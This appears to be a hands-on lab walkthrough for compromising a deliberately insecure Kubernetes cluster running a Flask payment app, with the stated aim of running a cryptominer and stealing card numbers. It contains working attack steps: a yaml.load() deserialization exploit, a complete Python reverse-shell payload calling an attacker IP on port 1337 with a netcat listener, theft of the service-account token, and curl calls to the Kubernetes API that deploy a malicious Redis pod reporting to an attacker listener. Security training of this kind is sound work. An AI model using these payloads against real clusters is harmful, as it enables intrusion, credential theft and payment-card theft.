## Attacking a Kubernetes Cluster

### Start the Vulnerable K8s Cluster

1. Run `./setup_insecure_kube.sh` to start the vulnerable K8s Cluster. Wait for the command to be done
2. Run `./setup_flask_stack.sh` to start the flask stack to be run on the cluster. Wait for the command to complete

### Verifying that the K8s stack is running

1. Run `kubectl get pods` should give you something like this:

    ```
        NAME            READY     STATUS    RESTARTS   AGE
        ngflask-redis   3/3       Running   0          1m
    ```

Make sure the `Status` is `Running`

2. Run `kubectl get svc` to check for running services. You should see:

    ```
    NAME                    TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE
    kubernetes              ClusterIP   10.96.0.1        <none>        443/TCP        15m
    ngflask-redis-service   NodePort    10.105.196.230   <none>        80:30070/TCP   1m

    ```

    Your `ngflask-redis-service` Cluster IP and Ports may vary based on your machine

3. Finally run `minikube service ngflask-redis-service --url` to get a full URL of the final service. Open your browser and paste this value.

It will be something like this `http://<IP>:<someport>`

Once you open in your browser, you must see this response: `Please POST JSON requests to this URL`. This means the service running correctly.

### Generating Artifacts

1. In a separate terminal or browser make an HTTP GET request to `http://<IP>:<someport>/generate`
It should come back with this response:
    ```
    {
        "success": "10 transactions generated successfully"
    }
    ```

Now, if you go to the `/status` url, you should see the latest transaction that has been logged by our app.

```
Latest Transaction Status
amount: 482
name: Samuel Chandler
card: ********8854
expiration: 425
Status: Success
```

#### Our objective is to compromise this cluster. Run our cryptominer and steal card numbers 😉

### Exploiting a Deserialization Flaw

* Our Flask app has a `yaml.load()` deserialization flaw. Using this flaw, one can potentially gain access to execute code on the backend-server. We will be using this vulnerability to exploit our app.
* Our app allows us to upload yaml files to capture expense information. We will load a malicious yaml file that should execute code for us.
* Run: `cd payloads`
* Run: (to upload the yaml file and identify the flaw)

```
http --form POST http://<IP>:<PORT>/upload file@test_payment.yml
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 26
Content-Type: application/json
Date: Sat, 15 Sep 2018 07:34:52 GMT
Server: nginx/1.11.13

{
    "success": "stored"
}
```
* Now go to the `/status` url, and you should see this (dump of all the environment variables)

### Reverse TCP Shell on our K8s Cluster

* you should be in the payloads directory. Open `reverse_shell.yml` with `atom reverse_shell.yml`
* change the external IP address to your VM's IP address with ifconfig. Also make sure that port 1337 is available on your VM
    `["echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.2.3\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > shell.py && python shell.py &"]`
* open a separate terminal and start your netcat listener by running `nc -l 1337`
* Now run:

```
http --form POST http://<IP>:<PORT>/upload file@reverse_shell.yml
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 26
Content-Type: application/json
Date: Sat, 15 Sep 2018 07:43:59 GMT
Server: nginx/1.11.13

{
    "success": "stored"
}
```

You should have gotten a netcat reverse TCP shell!
```
nc -l 1337
/bin/sh: can't access tty; job control turned off
/app #

```
Now you can interact with your target app and backend K8s cluster

**NOTE: Do NOT use the clear or Commd/Ctrl+C key. you will lose access to the shell**

### Pivoting to K8s cluster

* Navigate to `cd /run/secrets/kubernetes.io/serviceaccount` and run `ls -al`
* open and copy the token with `cat token` and copy to clipboard
* Now run: `export TOKEN=(paste token value here)`
* We are now going to masquerade with the cluster-admin's token.
* Let's start interacting with K8s API

    `curl -s https://10.96.0.1/api/v1/namespaces/default/pods -XGET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --insecure`
    
    `curl -s https://10.96.0.1/api/v1/namespaces/default/services -XGET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --insecure`

You should see a JSON Dump of all the pods and services running in the cluster at this time

Note `clusterIP` of the `redis-service` Service.

Open a new tab in terminal and launch a web-server by running `./tornado_server.py`

Change the value of `MASTERHOST` with the value of `clusterIP`.

Change the value of `LISTENER_IP` with the VM IP that can be fetched by running `ifconfig`

Change the value of `LISTENER_PORT` to the port web-server is running on(`9090`)

```
cat > mal-redis.json <<EOF
{
    "kind": "Pod",
    "apiVersion": "v1",
    "metadata": {
        "name": "mal-redis"
    },
    "spec": {
        "containers": [{
            "name": "mal-redis",
            "image": "we45/malicious-redis-slave",
            "env": [
              {
                "name": "MASTERHOST",
                "value": "10.109.162.114"
              },
              {
                "name": "MASTERPORT",
                "value": "6379"
              },
              {
                "name": "LISTENER_IP",
                "value": "192.168.2.116"
              },
              {
                "name": "LISTENER_PORT",
                "value": "9090"
              }
            ]
        }]
    }
}
EOF
```

`curl -s https://10.96.0.1/api/v1/namespaces/default/pods -XPOST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d@mal-redis.json --insecure`

`curl -s https://10.96.0.1/api/v1/namespaces/default/services -XGET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --insecure`
